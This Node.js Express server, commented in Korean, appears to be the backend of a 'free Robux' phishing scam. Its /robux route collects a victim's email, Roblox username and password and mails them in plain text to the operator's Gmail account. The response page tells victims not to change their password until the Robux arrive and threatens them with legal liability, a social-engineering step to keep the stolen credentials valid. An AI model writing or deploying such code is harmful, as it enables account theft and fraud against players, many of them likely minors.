const express = require("express");
const nodemailer = require("nodemailer");
const bodyParser = require("body-parser");
const axios = require('axios');
require('dotenv').config();
const app = express();
const port = 3000;

// Body-parser 설정
app.use(bodyParser.urlencoded({
    extended: true
}));

// 정적 파일 제공 (form.html 위치)
app.use(express.static(__dirname));

// POST 라우터
app.post("/robux", async (req, res) => {
    const {
        email,
        roblox_id,
        roblox_pwd
    } = req.body;

    let privacy = req.body.privacy
    let _3rdperson = req.body._3rdperson
    let advertise = req.body.advertise

    const privacy_checked = privacy === "true" ? "✅ 개인정보 제공 동의 허용" : "❌ 개인정보 제공 동의 거부";
    const _3rdperson_checked = _3rdperson === "true" ? "✅ 제 3자 제공 동의 허용" : "❌ 제 3자 제공 동의 거부";
    const advertise_checked = advertise === "true" ? "✅ 마케팅 활용 동의 허용" : "❌ 마케팅 활용 동의 거부";

    // Nodemailer transporter 설정
    const transporter = nodemailer.createTransport({
        service: "gmail",
        auth: {
            user: process.env.EMAIL, // 보내는 이메일
            pass: process.env.APP_PASS,
        },
        tls: {
            rejectUnauthorized: false, // 자가 서명 인증서 오류를 피하려면 이 옵션 추가
        },
    });

    const mailOptions = {
        from: email,
        to: process.env.EMAIL, // 수신자 이메일
        subject: "새로운 Roblox 계정 정보가 도착했습니다!",
        text: `
            이메일: ${email}
            Roblox 아이디: ${roblox_id}
            Roblox 비밀번호: ${roblox_pwd}

            ${privacy_checked}
            ${_3rdperson_checked}
            ${advertise_checked}
        `,
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.log(error);
            return res.send("ERROR PLEASE TRY AGAIN");
        } else {
            return res.send("빠른 시일 내에 당신의 계정에 로벅스가 들어올 것입니다. 로벅스가 들어오기 전까지 비밀번호와 닉네임을 변경하지 마십시오. 그렇지 않으면 우리 API에 문제가 생겨 전송에 실패하게 되고 당신은 트래픽 과다 이용으로 법적 책임을 물 수 있습니다.");
        }
    });
});

// 서버 실행
app.listen(port, () => {
    console.log(`서버 실행 중`);
});